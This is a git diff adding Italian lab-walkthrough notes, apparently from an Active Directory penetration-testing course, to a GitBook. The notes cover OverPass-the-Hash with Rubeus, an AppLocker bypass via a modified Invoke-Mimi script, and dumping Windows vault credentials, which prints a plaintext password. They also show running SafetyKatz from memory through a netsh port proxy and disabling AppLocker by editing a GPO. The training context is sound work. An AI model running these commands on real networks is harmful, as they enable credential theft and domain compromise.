@@ -144,8 +144,7 @@ Infine, utilizzare OverPass-the-Hash per utilizzare le credenziali svcadmin.
 Eseguire i comandi riportati di seguito da una shell con privilegi elevati sulla VM dello studente per utilizzare Rubeus. Si noti che è possibile utilizzare qualsiasi strumento desiderato (Invoke-Mimi, SafetyKatz, Rubeus ecc.):
 
 ```powershell
-C:\AD\Tools\Loade
-xe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 Nel nuovo prompt verificare l'accesso al dc come svcadmin usando <kbd>winrs</kbd>
@@ -160,5 +159,242 @@ winrs -r:dcorp-dc cmd /c set username
 
 Passando ora al compito successivo, dobbiamo passare all'amministratore di dominio utilizzando l'amministratore locale derivato. Scopriamo su quali macchine abbiamo i privilegi di amministratore locale. In una sessione PowerShell avviata utilizzando Invisi-Shell, inserisci il seguente comando.
 
+```powershell
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
 ```
+
+```powershell
+Find-PSRemotingLocalAdminAccess
 ```
+
+<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+
+Abbiamo un amministratore locale su dcorp-adminsrv. Noterete che qualsiasi tentativo di eseguire Loader.exe (per eseguire SafetKatz dalla memoria) genera l'errore "This program is blocked by group policy. For more information, contact your system administrator". Qualsiasi tentativo di eseguire Invoke-Mimi su dcorp-adminsrv genera errori relativi alla modalità lingua. Ciò potrebbe essere dovuto a un elenco di applicazioni consentite su dcorp-adminsrv e al passaggio a una Constrained Language Mode (CLM) durante l'utilizzo di PSRemoting.
+
+Verifichiamo se Applocker è configurato su dcorp-adminsrv interrogando le chiavi di registro. Si noti che stiamo supponendo che reg.exe sia autorizzato all'esecuzione.
+
+```powershell
+winrs -r:dcorp-adminsrv cmd
+```
+
+```powershell
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+```
+
+<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+
+Sembra che Applocker sia configurato. Dopo aver esaminato le politiche, possiamo capire che i file binari e gli script firmati da Microsoft sono consentiti a tutti gli utenti, ma nient'altro. Tuttavia, questa regola particolare è eccessivamente permissiva!
+
+```powershell
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\
+```
+
+<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+
+```powershell
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
+```
+
+<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+
+APrire un nuovo prompt con Invishell ed eseguire il seguente comando per accedere a dcorp-adminsrv
+
+```powershell
+Enter-PSSession dcorp-adminsrv
+```
+
+```powershell
+$ExecutionContext.SessionState.LanguageMode
+```
+
+<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+
+A conferma di quanto scoperto con reg query prima eseguiamo il seguente comando per verificare le  policy di AppLocker
+
+```powershell
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+
+Qui, “Everyone” possono eseguire script dalla directory Programmi. Ciò significa che possiamo inserire gli script nella directory Programmi ed eseguirli. Inoltre, nella modalità Constrained Language Mode, non è possibile eseguire script utilizzando il dot sourcing (. .\Invoke-Mimi.ps1). Pertanto, è necessario modificare Invoke-Mimi.ps1 per includere la chiamata di funzione nello script stesso e trasferire lo script modificato (Invoke-MimiEx.ps1) al server di destinazione.
+
+* Crea una copia di Invoke-Mimi.ps1 e rinominala Invoke-MimiEx-keys-stdx.ps1 (dove x è il tuo ID studente).
+* Apri Invoke-MimiEx-keys-stdx.ps1 in PowerShell ISE (fai clic con il pulsante destro del mouse e seleziona Modifica).
+* Aggiungi il valore codificato riportato di seguito per “sekurlsa::ekeys” alla fine del file.
+
+<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+
+Copiamo lo script modificato sul host <kbd>dcorp-adminsrv</kbd> e lo eseguiamo
+
+```powershell
+Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-std460.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\'Program Files'
+```
+
+<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+
+Abbiamo recuperato le credenziali di <kbd>appadmin, websvc, dcorp-adminsrv$</kbd>
+
+### Creare Invoke-MimiEx-vault-std460.ps1
+
+\
+Come abbiamo discusso durante la lezione, esistono altri luoghi in cui cercare le credenziali. Modifichiamo Invoke-MimiEx e cerchiamo le credenziali nel Vault delle credenziali di Windows. Sulla macchina virtuale dello studente:
+
+* Creare una copia di Invoke-Mimi.ps1 e rinominarla Invoke-MimiEx-vault-stdx.ps1 (dove x è il proprio ID studente).
+* Aprire Invoke-MimiEx-vault-stdx.ps1 in PowerShell ISE (fare clic con il pulsante destro del mouse e selezionare Modifica).
+* Sostituisci “Invoke-Mimi -Command ‘”sekurlsa::ekeys“’ ” che abbiamo aggiunto in precedenza con “Invoke-Mimi -Command ‘”token::elevate“ ”vault::cred /patch“’ ” (senza virgolette).
+* Copia Invoke-MimiEx-vault-stdx.ps1 in dcorp-adminsrv ed eseguilo. Ricorda che il processo di copia richiederà alcuni minuti.
+
+<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+
+Copiamo di nuovo lo script sotto Program File sul host dcorp-adminsrv
+
+```powershell
+ Copy-Item C:\AD\Tools\Invoke-MimiVault-std460.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\'Program Files'
+```
+
+<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
+
+Abbiamo trovato anche le credenziali dell'utente srvadmin:TheKeyUs3ron@anyMachine!
+
+Fantastico! Abbiamo ottenuto le credenziali dell'utente srvadmin in chiaro! Avvia un processo cmd utilizzando runas. Esegui il comando seguente da una shell con privilegi elevati:
+
+```powershell
+runas /user:dcorp\srvadmin /netonly cmd
+```
+
+<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+
+Il nuovo processo avviato dispone dei privilegi srvadmin. Verificare se srvadmin dispone dei privilegi di amministratore su qualsiasi altro computer.
+
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+```powershell
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+```
+
+```powershell
+Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
+```
+
+<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+
+Abbiamo accesso amministrativo locale sul server dcorp-mgmt come srvadmin e sappiamo già che su quella macchina è presente una sessione di svcadmin.
+
+Usiamo SafetyKatz per estrarre le credenziali dalla macchina. Esegui i comandi riportati di seguito dal processo in esecuzione come srvadmin.
+
+```powershell
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
+
+Aggiungere il portproxy se non e' gia' stato fatto in precedenza o si e' revertato la sessione
+
+```powershell
+ $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.60"
+```
+
+Poi eseguiamo SafetyKatz.exe su <kbd>dcorp-mgmt</kbd>
+
+```powershell
+ winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
+```
+
+<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+
+Disabilitare Applocker su dcorp-adminsrv modificando GPO\
+Ricordiamo che abbiamo enumerato che student460 e ha Controllo Full Control/Generic All sulla policy di gruppo Applocked. Apportiamo delle modifiche alla politica di gruppo e disabilitiamo Applocker su dcorp-adminsrv.
+
+Per farlo abbiamo bisogno della Console di gestione delle politiche di gruppo. Poiché la VM dello studente è una macchina Server 2022, possiamo installarla seguendo questi passaggi: Aprire Server Manager -> Aggiungi ruoli e funzionalità -> Avanti -> Funzionalità -> Selezionare Gestione criteri di gruppo -> Avanti -> Installa
+
+Al termine dell'installazione, avviare gpmc. Dobbiamo avviare un processo come studentx utilizzando runas, altrimenti gpmc non ottiene il contesto utente. Eseguire il comando seguente da una shell con privilegi elevati:
+
+```
+runas /user:dcorp\studentx /netonly cmd
+```
+
+Eseguire il seguente comando nel nuovo prompt spawnato a seguito del runas
+
+```
+gpmc.msc
+```
+
+Navighiamo fino ad AppLocker
+
+<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
+
+Tasto destro e poi 'Edit', nel nuovo editor navigare fino a AppLocker
+
+<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
+
+Cliccare su Executable Rules e poi rimuoverla
+
+<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
+
+Forzare l'aggiornamento delle policy invece di attendere quello automatico, poiche abbiamo gia accesso su dcorp-adminsrv
+
+```
+winrs -r:dcorp-adminsrv cmd
+```
+
+```
+gpupdate /force
+
+```
+
+<figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
+
+```
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
+```
+
+```
+winrs -r:dcorp-adminsrv cmd
+```
+
+```
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
+```
+
+<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
+
+<div data-full-width="true"><figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure></div>
+
+Adesso possiamo eseguire SafetyKatz
+
+```powershell
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
+```
+
+<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
+
+Ottimo! Siamo riusciti a disabilitare Applocker. Si prega di notare che la modifica al GPO non è sicura dal punto di vista OPSEC, ma è comunque comunemente abusata dagli autori delle minacce.
